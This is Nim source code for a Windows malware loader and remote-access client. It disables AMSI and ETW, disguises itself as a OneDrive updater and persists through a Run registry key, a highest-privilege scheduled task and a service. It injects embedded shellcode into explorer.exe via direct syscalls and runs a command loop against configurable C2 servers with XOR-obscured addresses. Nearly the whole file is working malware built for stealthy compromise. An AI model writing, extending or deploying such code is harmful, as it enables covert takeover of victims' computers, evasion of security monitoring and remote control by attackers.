import winim
import std/strutils
import std/os
import amsi_patch
import etw_patch
import syscalls

# Constants
const
  CMD_HEARTBEAT = 1
  CMD_EXIT = 999
  CMD_EXECUTE_SHELLCODE = 104

# Load the payload from Resource (.rc)
{.link: "src/payload.res".}

# Structs
type
  CONNECT_ADDRESS* {.packed.} = object
    szFlag*: array[32, char]
    szServerIP*: array[100, char]
    szPort*: array[8, char]
    iType*: int32
    bEncrypt*: int32
    szBuildDate*: array[12, char]
    iMultiOpen*: int32
    iStartup*: int32
    iHeaderEnc*: int32
    protoType*: char
    runningType*: char
    payloadType*: char
    szGroupName*: array[24, char]
    runasAdmin*: char
    szInstallDir*: array[260, char]
    szInstallName*: array[260, char]
    szDownloadUrl*: array[512, char]
    taskStartup*: char
    serviceStartup*: char
    registryStartup*: char
    iPumpSize*: int32
    szReserved*: array[3, char]
    clientID*: uint64
    parentHwnd*: uint64
    superAdmin*: uint64
    pwdHash*: array[64, char]

  PkgHeader* {.packed.} = object
    flag*: array[8, char]
    totalLen*: int32
    originLen*: int32

  CommandPkg* {.packed.} = object
    cmd*: uint32
    arg1*: uint32
    arg2*: uint32

# Helper to assign string to char array
proc toCharArray[N: static[int]](s: string): array[N, char] =
  for i in 0 ..< min(s.len, N):
    result[i] = s[i]

# Global configuration variable, exported to C so it's not optimized out
# and can be found by the builder searching for "FRMD26_CONFIG"
var g_config* {.exportc, dynlib, used.} = CONNECT_ADDRESS(
  szFlag: toCharArray[32]("FRMD26_CONFIG"),
  szServerIP: toCharArray[100]("127.0.0.1"),
  szPort: toCharArray[8]("8080"),
  iType: 0,
  bEncrypt: 0,
  szBuildDate: toCharArray[12]("2026-02-10"),
  iMultiOpen: 1,
  iStartup: 1,
  iHeaderEnc: 1,
  protoType: 0.char,
  runningType: 0.char,
  payloadType: 0.char,
  szGroupName: toCharArray[24]("default"),
  runasAdmin: 1.char,
  szInstallDir: toCharArray[260](r"C:\ProgramData\Microsoft\OneDriveUpdate"),
  szInstallName: toCharArray[260]("OneDriveUpdate.exe"),
  szDownloadUrl: toCharArray[512](""),
  taskStartup: 0.char,
  serviceStartup: 0.char,
  registryStartup: 1.char,
  iPumpSize: 0,
  clientID: 0,
  parentHwnd: 0,
  superAdmin: 0
)

# Helper to convert char array to string
proc toString(arr: openArray[char]): string =
  result = ""
  for c in arr:
    if c == '\0': break
    result.add(c)

# --- Patching Logic ---

proc patchPayloadConfig(payload: var openArray[byte]) =
  # Search for FRMD26_CONFIG pattern in the shellcode
  let flag = "FRMD26_CONFIG"
  let flagBytes = cast[seq[byte]](flag)
  
  var foundIndex = -1
  for i in 0 .. payload.len - flagBytes.len:
    var match = true
    for j in 0 ..< flagBytes.len:
      if payload[i+j] != flagBytes[j]:
        match = false
        break
    if match:
      foundIndex = i
      break
  
  if foundIndex != -1:
    # We found the config struct in the shellcode!
    # Overwrite it with our current g_config (which might have been patched by Master)
    # Be careful: g_config has "FRMD26_CONFIG" at start, so it matches the pattern perfectly.
    
    # Check if size matches
    if foundIndex + sizeof(CONNECT_ADDRESS) <= payload.len:
      copyMem(addr payload[foundIndex], addr g_config, sizeof(CONNECT_ADDRESS))

# --- Installation Logic ---

proc createScheduledTask(name, path: string) =
  # schtasks /create /tn "Name" /tr "Path" /sc onlogon /rl highest /f
  let cmd = "schtasks /create /tn \"" & name & "\" /tr \"" & path & "\" /sc onlogon /rl highest /f"
  discard execShellCmd(cmd)

proc createService(name, path: string) =
  # sc create "Name" binPath= "Path" start= auto
  let cmd = "sc create \"" & name & "\" binPath= \"" & path & "\" start= auto"
  discard execShellCmd(cmd)
  # Try to start it immediately
  discard execShellCmd("sc start \"" & name & "\"")

proc installSelf() =
  # Get Current Path
  var szPath: array[MAX_PATH, char]
  GetModuleFileNameA(0, addr szPath[0], MAX_PATH)
  let currentPath = toString(szPath)
  
  let installDir = toString(g_config.szInstallDir)
  let installName = toString(g_config.szInstallName)
  let targetPath = installDir & "\\" & installName

  # Check if we are already running from install path
  if currentPath.toLowerAscii() == targetPath.toLowerAscii():
    return

  try:
    # Create Directory
    createDir(installDir)
    
    # Copy Self
    copyFile(currentPath, targetPath)
    
    # 1. Persistence (Registry)
    if g_config.registryStartup == 1.char:
      var hKey: HKEY
      if RegOpenKeyExA(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, addr hKey) == ERROR_SUCCESS:
        let valName = "OneDrive Update"
        RegSetValueExA(hKey, valName, 0, REG_SZ, cast[ptr BYTE](unsafeAddr targetPath[0]), int32(targetPath.len + 1))
        RegCloseKey(hKey)

    # 2. Persistence (Task Scheduler)
    if g_config.taskStartup == 1.char:
      createScheduledTask("OneDrive Update Task", targetPath)

    # 3. Persistence (Service)
    if g_config.serviceStartup == 1.char:
      createService("OneDrive Update Service", targetPath)

    # Execute Installed Copy
    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    si.cb = int32(sizeof(si))
    
    if CreateProcessA(nil, targetPath.cstring, nil, nil, FALSE, 0, nil, nil, addr si, addr pi) != 0:
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      # Exit Current Process
      ExitProcess(0)
      
  except:
    when defined(debug):
      var msg = "Installation failed: " & getCurrentExceptionMsg()
      MessageBoxA(0, msg.cstring, "Error", 0)
    discard

# --- Injection Logic ---

proc getExplorerPID(): DWORD =
  var entry: PROCESSENTRY32
  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  
  let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snapshot == INVALID_HANDLE_VALUE:
    return 0
    
  if Process32First(snapshot, addr entry):
    while true:
      var name = ""
      for c in entry.szExeFile:
        if c == 0: break
        name.add(char(c))
        
      if name.toLowerAscii() == "explorer.exe":
        CloseHandle(snapshot)
        return entry.th32ProcessID
        
      if not Process32Next(snapshot, addr entry):
        break
        
  CloseHandle(snapshot)
  return 0

proc injectIntoExplorer(shellcode: openArray[byte]): bool =
  let pid = getExplorerPID()
  if pid == 0:
    return false
    
  var clientId: CLIENT_ID
  clientId.UniqueProcess = cast[HANDLE](pid)
  clientId.UniqueThread = 0
  
  var oa: OBJECT_ATTRIBUTES
  var hProcess: HANDLE
  
  # 1. Open Process using Syscall
  var status = syscallNtOpenProcess(
    addr hProcess,
    PROCESS_ALL_ACCESS, 
    addr oa,
    addr clientId
  )
  
  if status != 0: # STATUS_SUCCESS = 0
    return false
    
  # 2. Allocate Memory
  var baseAddr: PVOID = nil
  var regionSize: SIZE_T = cast[SIZE_T](len(shellcode))
  
  status = syscallNtAllocateVirtualMemory(
    hProcess,
    addr baseAddr,
    0,
    addr regionSize,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )
  
  if status != 0:
    CloseHandle(hProcess)
    return false
    
  # 3. Write Shellcode
  var bytesWritten: SIZE_T
  status = syscallNtWriteVirtualMemory(
    hProcess,
    baseAddr,
    unsafeAddr shellcode[0],
    cast[SIZE_T](len(shellcode)),
    addr bytesWritten
  )
  
  if status != 0:
    CloseHandle(hProcess)
    return false
    
  # 4. Create Thread
  var hThread: HANDLE
  status = syscallNtCreateThreadEx(
    addr hThread,
    THREAD_ALL_ACCESS,
    nil,
    hProcess,
    baseAddr,
    nil,
    0,
    0,
    0, 0, nil
  )
  
  CloseHandle(hProcess)
  
  if status != 0:
    return false
    
  CloseHandle(hThread)
  return true

# --- Legacy Client Logic (kept for reference/DLL compilation) ---
# NOTE: The actual client logic has been moved to src/payload.nim.
# This section is deprecated in this Loader file and will be removed.


var sock: SOCKET = INVALID_SOCKET

proc send_pkg(s: SOCKET, cmd: uint32, data: pointer, len: int) =
  var header: PkgHeader
  header.flag = toCharArray[8]("FRMD26?")
  
  # Body = CommandPkg + data
  header.originLen = int32(sizeof(CommandPkg) + len) 
  header.totalLen = int32(sizeof(PkgHeader) + header.originLen)

  var cmdPkg: CommandPkg
  cmdPkg.cmd = cmd
  cmdPkg.arg1 = 0
  cmdPkg.arg2 = 0

  send(s, cast[ptr char](addr header), int32(sizeof(PkgHeader)), 0)
  send(s, cast[ptr char](addr cmdPkg), int32(sizeof(CommandPkg)), 0)
  if len > 0:
    send(s, cast[ptr char](data), int32(len), 0)

import std/random

proc run_client_loop() =
  var wsa: WSAData
  if WSAStartup(0x0202, addr wsa) != 0:
    return

  # Use global config
  var rawIP = toString(g_config.szServerIP)
  
  # Decrypt IP if needed
  if g_config.bEncrypt == 1:
    var decrypted = ""
    for c in rawIP:
      decrypted.add(char(byte(c) xor 0x5A))
    rawIP = decrypted

  let serverPort = parseInt(toString(g_config.szPort))
  var serverList = rawIP.split(";")
  
  # If random mode (0), shuffle the list
  if g_config.runningType == 0.char:
    randomize()
    shuffle(serverList)

  # Parallel mode (1) handling:
  # In this simple loop implementation, we try IPs sequentially.
  # True parallel connection would require async/threads.
  # For stability, sequential retry is sufficient for "multi-c2" availability.

  var currentServerIdx = 0

  while true:
    if sock == INVALID_SOCKET:
      sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
      if sock == INVALID_SOCKET:
        Sleep(1000)
        continue

      var addr_in: sockaddr_in
      addr_in.sin_family = AF_INET
      addr_in.sin_port = htons(uint16(serverPort))
      
      let currentIP = serverList[currentServerIdx]
      addr_in.sin_addr.S_addr = inet_addr(currentIP)

      if connect(sock, cast[ptr sockaddr](addr addr_in), int32(sizeof(addr_in))) == SOCKET_ERROR:
        closesocket(sock)
        sock = INVALID_SOCKET
        
        # Try next server
        currentServerIdx = (currentServerIdx + 1) mod serverList.len
        Sleep(2000) # Short delay before next retry
        continue
      
      # Send Heartbeat as handshake
      send_pkg(sock, CMD_HEARTBEAT, nil, 0)

    # Receive loop
    var header: PkgHeader
    var ret = recv(sock, cast[ptr char](addr header), int32(sizeof(PkgHeader)), 0)
    
    if ret <= 0:
      closesocket(sock)
      sock = INVALID_SOCKET
      Sleep(5000)
      continue
    
    # Check Header (Basic check)
    if header.totalLen <= 0 or header.originLen < 0:
       closesocket(sock)
       sock = INVALID_SOCKET
       continue

    if header.originLen > 0:
      var buffer = newSeq[byte](header.originLen)
      var totalRead = 0
      var readErr = false
      
      while totalRead < header.originLen:
        ret = recv(sock, cast[ptr char](addr buffer[totalRead]), int32(header.originLen - totalRead), 0)
        if ret <= 0: 
           readErr = true
           break
        totalRead += ret
      
      if readErr:
        closesocket(sock)
        sock = INVALID_SOCKET
        continue
      
      # Process Command
      if totalRead >= sizeof(CommandPkg):
        var cmdPkgPtr = cast[ptr CommandPkg](addr buffer[0])
        var dataLen = totalRead - sizeof(CommandPkg)
        # var dataPtr = if dataLen > 0: addr buffer[sizeof(CommandPkg)] else: nil
        
        case cmdPkgPtr.cmd:
        of CMD_HEARTBEAT:
          # Reply Heartbeat
          send_pkg(sock, CMD_HEARTBEAT, nil, 0)
        of CMD_EXIT:
          closesocket(sock)
          return
        else:
          discard

when isMainModule:
  # Initialize config
  # init_default_config() - Removed, using static initialization

  # 1. Evasion (AMSI / ETW)
  discard patchAmsi()
  discard patchEtw()
  
  # 2. Anti-Sandbox
  Sleep(2000)

  # 3. Installation & Persistence
  installSelf()
  
  # 4. Patch Payload Config
  # Load shellcode from Resource
  # Resource ID is 1, Type is RT_RCDATA (10)
  # But we defined it as user type "RCDATA" in .rc file if we used that string.
  # Let's check payload.rc content.
  # The previous write was: 1 RCDATA "payload.bin"
  # So ID is 1 (int), Type is RCDATA (which is a standard type, ID 10)
  
  # MAKEINTRESOURCE(1) -> cast[cstring](1) works in C but Nim is stricter
  let hRes = FindResourceA(0, cast[cstring](1), cast[cstring](10)) # RT_RCDATA = 10
  if hRes != 0:
    let hGlobal = LoadResource(0, hRes)
    let payloadSize = SizeofResource(0, hRes)
    let payloadPtr = LockResource(hGlobal)
    
    if payloadPtr != nil:
      var finalPayload = newSeq[byte](payloadSize)
      copyMem(addr finalPayload[0], payloadPtr, payloadSize)
      patchPayloadConfig(finalPayload)

      # 5. Process Injection (Target: explorer.exe)
      # This makes explorer.exe the "Network Connection Program"
      if injectIntoExplorer(finalPayload):
        # Injection successful, exit self
        discard
      else:
        # Injection failed, fallback to local run
        # Execute shellcode in current process directly
        # Allocate executable memory
        let pMemory = VirtualAlloc(nil, finalPayload.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if pMemory != nil:
          copyMem(pMemory, unsafeAddr finalPayload[0], finalPayload.len)
          let funcPtr = cast[proc() {.stdcall.}](pMemory)
          funcPtr()
        else:
          # If allocation fails, try legacy loop (unlikely but safe fallback)
          run_client_loop()
